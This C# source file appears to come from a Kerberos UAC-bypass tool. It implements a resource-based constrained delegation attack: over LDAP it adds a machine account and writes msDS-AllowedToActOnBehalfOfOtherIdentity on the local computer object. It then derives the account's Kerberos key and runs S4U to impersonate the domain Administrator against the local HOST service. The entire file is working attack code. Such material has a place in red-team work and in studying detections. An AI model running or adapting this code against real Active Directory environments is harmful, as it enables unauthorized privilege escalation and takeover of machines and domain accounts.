using System;
using System.Text;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.DirectoryServices.Protocols;

namespace KRBUACBypass.Methods
{
    public class Rbcd
    {
        public static string RootDN;
        public static string ComputersDN;
        public static string NewComputersDN;
        public static string TargetMachineDN;

        public static void Execute(string domain, string dc, int port, string computerName, string computerPassword)
        {
            string targetUser = $"{domain}\\Administrator";
            string targetSPN = $"HOST/{Environment.MachineName}";
            string altSname = "";
            string computerHash = "";
            string outfile = "";
            bool ptt = false;
            string targetDomain = "";
            string targetDC = "";
            bool self = false;
            bool opsec = false;
            bool bronzebit = false;
            bool pac = true;
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.rc4_hmac; // throwaway placeholder, changed to something valid
            KRB_CRED tgs = null;
            string proxyUrl = null;
            string createnetonly = null;
            bool show = false;

            SecurityIdentifier securityIdentifier = null;
            LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(dc, port);
            LdapConnection connection = new LdapConnection(identifier);

            if (connection != null)
            {
                connection.SessionOptions.Sealing = true;
                connection.SessionOptions.Signing = true;
                connection.Bind();

                foreach (string DC in domain.Split('.'))
                {
                    RootDN += ",DC=" + DC;
                }

                RootDN = RootDN.TrimStart(',');
                ComputersDN = "CN=Computers," + RootDN;
                NewComputersDN = $"CN={computerName}," + ComputersDN;
                TargetMachineDN = $"CN={Environment.MachineName}," + ComputersDN;

                SearchResultEntryCollection Entries = Ldap.GetSearchResultEntries(connection, ComputersDN, "(&(samAccountType=805306369)(|(name=" + computerName + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
                if (Entries.Count != 0)
                {
                    foreach (SearchResultEntry entry in Entries)
                    {
                        try
                        {
                            securityIdentifier = new SecurityIdentifier(entry.Attributes["objectSid"][0] as byte[], 0);
                            Console.WriteLine($"[*] Sid of the new machine account: {securityIdentifier.Value}.");
                        }
                        catch
                        {
                            Console.WriteLine("[-] Can not retrieve the sid.");
                        }
                    }
                }
                else
                {
                    AddRequest addRequest = new AddRequest(NewComputersDN, new DirectoryAttribute[] {
                        new DirectoryAttribute("DnsHostName", computerName + "." + domain),
                        new DirectoryAttribute("SamAccountName", computerName + "$"),
                        new DirectoryAttribute("userAccountControl", "4096"),
                        new DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + computerPassword + "\"")),
                        new DirectoryAttribute("objectClass", "Computer"),
                        new DirectoryAttribute("ServicePrincipalName", "HOST/" + computerName + "." + domain, "RestrictedKrbHost/" + computerName + "." + domain, "HOST/" + computerName, "RestrictedKrbHost/" + computerName)
                    });

                    try
                    {
                        connection.SendRequest(addRequest);
                        Console.WriteLine($"[*] Machine account {computerName}$ added.");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] The new machine could not be created! User may have reached ms-DS-MachineAccountQuota limit.");
                    }

                    // Get SID of the new computer object
                    Entries = Ldap.GetSearchResultEntries(connection, NewComputersDN, "(&(samAccountType=805306369)(|(name=" + computerName + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
                    foreach (SearchResultEntry entry in Entries)
                    {
                        try
                        {
                            securityIdentifier = new SecurityIdentifier(entry.Attributes["objectSid"][0] as byte[], 0);
                            Console.WriteLine($"[*] Sid of the new machine account: {securityIdentifier.Value}.");
                        }
                        catch
                        {
                            Console.WriteLine("[-] Can not retrieve the sid.");
                        }
                    }
                }

                string nTSecurityDescriptor = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + securityIdentifier + ")";
                RawSecurityDescriptor rawSecurityIdentifier = new RawSecurityDescriptor(nTSecurityDescriptor);
                byte[] descriptorBuffer = new byte[rawSecurityIdentifier.BinaryLength];
                rawSecurityIdentifier.GetBinaryForm(descriptorBuffer, 0);

                ModifyRequest modifyRequest = new ModifyRequest(TargetMachineDN, DirectoryAttributeOperation.Replace, "msDS-AllowedToActOnBehalfOfOtherIdentity", descriptorBuffer);
                try
                {
                    ModifyResponse modifyResponse = (ModifyResponse)connection.SendRequest(modifyRequest);
                    Console.WriteLine($"[*] {computerName}$ can now impersonate users on {TargetMachineDN} via S4U2Proxy.");
                }
                catch
                {
                    Console.WriteLine("[-] Could not modify attribute msDS-AllowedToActOnBehalfOfOtherIdentity, check that your user has sufficient rights.");
                }

            }

            if (!String.IsNullOrEmpty(computerPassword))
            {
                //string salt = String.Format("{0}{1}", domain.ToUpper(), computerName);
                string salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), computerName.TrimEnd('$').ToLower(), domain.ToLower());
                Console.WriteLine(encType);
                Console.WriteLine(salt);
                computerHash = Crypto.KerberosPasswordHash(encType, computerPassword, salt);
            }


            S4U.Execute(computerName, domain, computerHash, encType, targetUser, targetSPN, outfile, ptt, dc, altSname, tgs, targetDC, targetDomain, self, opsec, bronzebit, pac, proxyUrl, createnetonly, show);
        }
            
    }
}
